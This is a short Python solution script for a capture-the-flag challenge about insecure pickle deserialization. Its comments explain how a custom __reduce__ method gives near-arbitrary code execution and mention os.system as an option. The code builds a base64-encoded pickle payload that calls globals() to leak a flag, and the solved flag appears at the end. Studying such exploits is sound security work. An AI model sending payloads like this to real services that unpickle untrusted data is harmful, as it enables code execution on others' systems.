import pickle
from base64 import b64encode

'''
I'm not an expert on python pickles but after scrolling through
a blog post about them (https://davidhamann.de/2020/04/05/exploiting-python-pickle/) I learnad that the basics are:
When objects are reconstructed in the unpickling (pickle.loads()) process the objects 
reduce() method is called. By defining our own reduce() method we almost have arbitrary code execution. 
As mentioned in the blog post the reduce() method should return two things:
1. A callable object, a nice alternative for exploits is os.system
2. A tuple containing the arguments to be passed to the object in "1."
For this challenge we see that the variable "flag" is set in the global scope so by choosing the globals() method
as our callable object we can print the flag. We simply pass an empty tuple since globals() takes no arguments. 
'''

class get_flag:
	def __reduce__(self):
		return (globals, tuple()) 

obj = [get_flag()]

print(b64encode(pickle.dumps(obj)).decode())

# actf{you_got_yourself_out_of_a_pickle}
